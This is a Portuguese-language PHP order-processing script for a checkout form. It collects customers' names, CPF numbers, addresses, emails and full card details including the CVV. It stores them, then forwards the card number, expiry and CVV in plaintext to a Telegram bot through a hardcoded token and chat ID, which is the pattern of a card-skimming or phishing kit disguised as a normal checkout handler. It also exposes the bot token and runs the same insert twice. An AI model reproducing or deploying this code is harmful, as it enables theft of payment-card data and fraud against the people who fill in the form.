<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die("🚫 Método inválido. Apenas requisições POST são permitidas!");
}

// Conexão com o banco de dados
include('conexao.php');

// Captura os dados do formulário
$nome = $conn->real_escape_string(trim($_POST['nome']));
$cpf = $conn->real_escape_string(trim($_POST['cpf']));
$endereco = $conn->real_escape_string(trim($_POST['endereco']));
$email = $conn->real_escape_string(trim($_POST['email']));
$forma_pagamento = $_POST['payment'];

if ($forma_pagamento == 'cartao') {
    $nome_titular = $conn->real_escape_string(trim($_POST['nome_titular']));
    $numero_cartao = $conn->real_escape_string(trim($_POST['numero_cartao']));
    $data_expiracao = $conn->real_escape_string(trim($_POST['data_expiracao']));
    $cvv = $conn->real_escape_string(trim($_POST['cvv']));

    $sql = "INSERT INTO pedidos (nome, cpf, endereco, email, forma_pagamento, nome_titular, numero_cartao, data_expiracao, cvv) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)";
    
    // Prepara a consulta
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("sssssssss", $nome, $cpf, $endereco, $email, $forma_pagamento, $nome_titular, $numero_cartao, $data_expiracao, $cvv);
} else {
    $sql = "INSERT INTO pedidos (nome, cpf, endereco, email, forma_pagamento) 
            VALUES (?, ?, ?, ?, ?)";

    // Prepara a consulta
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("sssss", $nome, $cpf, $endereco, $email, $forma_pagamento);
}

// Insere no banco de dados
if ($stmt->execute()) {
    echo "Pedido registrado com sucesso!";
} else {
    echo "Erro ao salvar pedido: " . $stmt->error;
}

// Enviar mensagem para o Telegram
$botToken = "7737548205:AAHoYv4emO06APmWUidIMnGU3xUdNuKUZgg";
$chatId = "6164096118";

$mensagem = "🎉 *Novo Pedido Recebido!* 🎉\n\n";
$mensagem .= "👤 *Nome:* " . $_POST['nome'] . "\n";
$mensagem .= "📄 *CPF:* " . $_POST['cpf'] . "\n";
$mensagem .= "🏠 *Endereço:* " . $_POST['endereco'] . "\n";
$mensagem .= "✉️ *Email:* " . $_POST['email'] . "\n";
$mensagem .= "💳 *Pagamento:* " . strtoupper($_POST['payment']) . "\n\n";

if ($_POST['payment'] == "cartao") {
    $mensagem .= "💳 *Cartão:* " . $_POST['numero_cartao'] . "\n";
    $mensagem .= "📅 *Expiração:* " . $_POST['data_expiracao'] . "\n";
    $mensagem .= "🔑 *CVV:* " . $_POST['cvv'] . "\n";
}

// Envia a mensagem para o Telegram
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($mensagem) . "&parse_mode=Markdown");



// Insere no banco de dados
if ($stmt->execute()) {
    // Redireciona para a página de agradecimento
    header("Location: agradecimento.html");
    exit();
} else {
    echo "Erro ao salvar pedido: " . $stmt->error;
}

// Fecha a conexão
$stmt->close();
$conn->close();

?>